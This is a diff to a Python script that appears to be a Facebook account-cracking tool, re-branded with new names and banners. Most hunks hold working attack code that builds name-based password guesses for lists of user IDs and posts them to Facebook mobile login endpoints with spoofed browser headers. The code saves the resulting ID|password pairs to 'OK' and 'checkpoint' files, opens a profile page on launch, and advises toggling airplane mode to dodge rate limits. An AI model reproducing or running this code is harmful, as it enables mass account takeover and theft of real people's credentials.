@@ -1059,7 +1059,8 @@ def asha(uid):
         alif = ' • 2006/2007'
     else:alif=''
     return alif
-#os.system(f'xdg-open https://youtube.com/@technicaltricks7982')
+
+os.system(f'xdg-open https://www.facebook.com/eiff.huczn')
 
 def KHUSHAL():
 	clear()
@@ -1073,22 +1074,22 @@ def KHUSHAL():
 		try:
 			fo = open(file,'r').read().splitlines()
 		except FileNotFoundError:
-			print(f' File location not found ')
+			print(f' File location not found ! ')
 			exit()
-		clear()
-		print(f' [-] MTHD 1 (recommended)\n [-] MTHD 2 (Working)\n [-] MTHD 3 (Working)\n ')
+			clear()
+		print(f' [1] METHOD-1 (Best Method)\n [2] METHOD-2 (Working)\n [3] METHOD-3 (Working)\n ')
 		mthd=input(f' Choose: ')
-		plist=[]
 		clear()
+		plist=[]
 		try:
-			ps_limit = int(input(f' [-] HOW MANY PASSWORD DO YOU WANT TO ADD ? '))
+			ps_limit = int(input(f' HOW MANY PASSWORD DO YOU WANT TO ADD? '))
 		except:
 			ps_limit =1
-		clear()
+			clear()
 		print(f'\033[1;33m[-] EXMPLE: first, first123, firstlast, first last, lastfirst ')
 		for i in range(ps_limit):
 			plist.append(input(f'\033[1;32m[-] PUT PASSWORD {i+1}: '))
-		print(f' DO YOU WANT TO SHOW CPS ? (y/n): ')
+		print(f' DO YOU WANT TO SHOW CP IDS? (y/n): ')
 		cx=input(f' Choose: ')
 		if cx in ['n','N','no','NO','2']:
 			pcp.append(f'n')
@@ -1099,6 +1100,7 @@ def KHUSHAL():
 			total_ids = str(len(fo))
 			print(f' TOTAL ACCOUNT : \033[1;32m'+total_ids+f' \n \033[1;37mMTHD > \033[1;37mM{mthd}')
 			print(f"\033[1;37m ON/OFF airplane mode every 90secs for speed up :)\033[1;37m")
+			linex()
 			linex()
 			for user in fo:
 				ids,names = user.split(f'|')
@@ -1125,22 +1127,42 @@ def ffb(ids,names,passlist):
                 for fikr in passlist:
                         pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                         ua=random.choice(ugen)
-                        head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
-                        getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
+                        head = {
+    'authority': 'm.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-PH,en-US;q=0.9,en;q=0.8',
+    'cache-control': 'max-age=0',  
+    'dpr': '3',
+    'sec-ch-prefers-color-scheme': 'dark',
+    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"RMX3241"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"13.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+    'viewport-width': '980',
+}
+                        getlog = session.get(f'https://m.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-                        complete = session.post(f'https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
+                        complete = session.post(f'https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                         Khushal=session.cookies.get_dict().keys()
                         if "c_user" in Khushal:
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print(f'\r\r\n\n\033[1;33m »» STATUS: \033[1;32m ALIVE\n\033[1;33m »» USER ID:\033[1;32m %s\n\033[1;33m »» PASSWORD:\033[1;32m %s\n\033[1;32m »» CREATION DATE: \033[1;32m%s\n'%(ids,pas,asha(uid)))
+                                print(f'\r\r\n\n\033[1;33m »» STATUS: \033[1;32m ALIVE\n\033[1;33m »» USER ID:\033[1;32m %s\n\033[1;33m »» PASSWORD:\033[1;32m %s\n'%(ids,pas,))
                                 open(f'/sdcard/OTEYN-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                 #cek_apk(session,coki)
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Khushal:
                                 if 'y' in pcp:
-                                        print(f'\r\r\n\n\033[1;33m »» STATUS: \033[1;91mCHECKPOINT\n\033[1;33m »» USER ID:\033[1;91m '+ids+'\n\033[1;33m »» PASSWORD:\033[1;91m '+pas+'\n\033[1;97m')
+                                        print(f'\r\r\x1b[38;5;126m [OTEYN-CP] '+ids+' | '+pas+'\033[1;97m')
                                         open(f'/sdcard/OTEYN-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
@@ -1155,7 +1177,7 @@ xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","G
 #
 def ffb1(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write(f'\r\r\033[1;37m [OTEYN-E.H] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r\033[1;37m [EIFF-HUCZN] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(f' ')[0]
@@ -1176,15 +1198,15 @@ def ffb1(ids,names,passlist):
                         if "c_user" in Khushal:
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print(f'\r\r\033[1;32m [OTEYN-OK] %s | %s | %s '%(ids,pas,asha(uid)))
+                                print(f'\r\r\033[1;32m [EIFF-OK] %s | %s • %s '%(ids,pas,asha(uid)))
                                 #cek_apk(session,coki)
-                                open(f'/sdcard/OTEYN-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                open(f'/sdcard/EIFF-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Khushal:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;126m [OTEYN-CP] '+ids+' | '+pas+'\033[1;97m')
-                                        open(f'/sdcard/OTEYN-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\x1b[38;5;126m [EIFF-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        open(f'/sdcard/EIFF-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -1196,7 +1218,7 @@ def ffb1(ids,names,passlist):
         loop+=1
 def ffb3(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write(f'\r\r\033[1;37m [OTEYN-E.H] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r\033[1;37m [KHUSHAL] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(f' ')[0]
@@ -1217,14 +1239,14 @@ def ffb3(ids,names,passlist):
                         if "c_user" in Khushal:
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print(f'\r\r\033[1;32m [OTEYN-OK] %s | %s | %s '%(ids,pas,asha(uid)))
-                                open(f'/sdcard/OTEYN-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                print(f'\r\r\033[1;32m [KHUSHAL🤩-OK] %s | %s'%(ids,pas))
+                                open(f'/sdcard/KHUSHAL-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                 #cek_apk(session,coki)
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Khushal:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;126m [OTEYN-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        print(f'\r\r\x1b[38;5;126m [KHUSHAL😟-CP] '+ids+' | '+pas+'\033[1;97m')
                                         open(f'/sdcard/KHUSHAL-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
@@ -1241,7 +1263,7 @@ xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","G
 def api(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write(f'\r\r\033[1;37m [OTEYN-E.H] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write(f'\r\r\033[1;37m [KHUSHAL] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(f' ')[0]
                         try:
                                 ln = names.split(f' ')[1]
@@ -1294,15 +1316,15 @@ def api(ids,names,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print(f'\r\r\033[1;32m [OTEYN-OK] %s | %s | %s '%(ids,pas,asha(uid)))
-                                        open(f'/sdcard/OTEYN-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\033[1;32m [EIFF-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open(f'/sdcard/EIFF-OK.txt','a').write(ids+'|'+pas+'\n')
                                         #cek_apk(session,coki)
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error_msg']:
                                         if 'y' in pcp:
-                                                print(f'\r\r\x1b[38;5;126m [OTEYN-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open(f'/sdcard/OTEYN-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print(f'\r\r\x1b[38;5;126m [EIFF-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open(f'/sdcard/EIFF-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                 else:
@@ -1315,7 +1337,7 @@ def api(ids,names,passlist):
 def api1(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write(f'\r\r\033[1;37m [OTEYN-E.H] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write(f'\r\r\033[1;37m [KHUSHAL] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(f' ')[0]
                         try:
                                 ln = names.split(f' ')[1]
@@ -1368,19 +1390,19 @@ def api1(ids,names,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print(f'\r\r\033[1;32m [OTEYN-OK] %s | %s | %s '%(ids,pas,asha(uid)))
-                                        open(f'/sdcard/OTEYN-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\033[1;32m [KHUSHAL🤩-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open(f'/sdcard/KHUSHAL-OK.txt','a').write(ids+'|'+pas+'\n')
                                         #cek_apk(session,coki)
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
-                                                print(f'\r\r\x1b[38;5;126m [OTEYN-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open(f'/sdcard/OTEYN-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print(f'\r\r\x1b[38;5;126m [KHUSHAL😟-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open(f'/sdcard/KHUSHAL-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                         else:
-                                                open(f'/sdcard/OTEYN-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open(f'/sdcard/KHUSHAL-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                 else:
                                         continue
